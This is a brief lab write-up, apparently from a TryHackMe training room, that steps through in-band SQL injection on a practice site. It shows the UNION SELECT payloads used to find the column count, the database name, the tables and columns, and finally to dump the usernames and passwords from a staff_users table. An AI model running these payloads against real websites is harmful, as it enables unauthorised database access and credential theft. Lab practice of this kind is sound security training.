In-Band SQL Injection

Starting with Error-Based SQL Injection
Prints an error message direct to the browser screen which makes useful to enumerate a database

https://website.thm/article?id=1 UNION SELECT 1;-- (Prints an error messagae which prompts us to do further enumeration)
ERROR Message: "SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns"

Lets try again by putting another column.
https://website.thm/article?id=1 UNION SELECT 1,2;--
ERROR Message: "SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns"

We try again
https://website.thm/article?id=1 UNION SELECT 1,2,3;--
We get something in the third column
Message: "Article ID: 1  Hi and welcome to my very first article for my new website......"  Error message has gone.

We change the id to 0 in order to not display the artical
https://website.thm/article?id=0 UNION SELECT 1,2,3;--
Result: "Article ID: 1 3" Cool result, we move on by crafting another payload.

https://website.thm/article?id=0 UNION SELECT 1,2,database();--
payload displays the name of the database
name: "sqli_one"

https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema ='sqli_one';--
This payload exposes the name of tables in the database name 'sqli_one'
Name "article and staff_users"

https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name ='staff_users';--
This payload exposes the columns in the table name 'staff_users'
Name "id,password,username"

So Now we need a password for the user Martin

https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(username,':',password separator '<br>') from staff_users;--
This payload exposes the usernames and passwords of users in the table called "staff_users"
admin:p4ssword
martin:pa$$word
jim:work123

